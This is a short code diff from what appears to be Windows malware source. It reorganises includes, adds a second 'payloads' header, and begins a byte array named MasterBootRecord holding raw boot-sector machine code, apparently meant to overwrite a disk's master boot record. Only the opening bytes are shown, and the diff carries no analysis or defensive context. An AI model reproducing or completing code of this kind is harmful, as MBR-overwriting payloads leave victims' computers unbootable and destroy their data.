@@ -5,12 +5,9 @@
 #define MULTIBYTE
 #endif
 
-#include <iostream>
-#include <Windows.h>
-#include <math.h>
-#include <random>
-
+#include "include.h"
 #include "payloads.h"
+#include "otherpayloads.h"
 
 const BYTE MasterBootRecord[] = { 
 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50, 
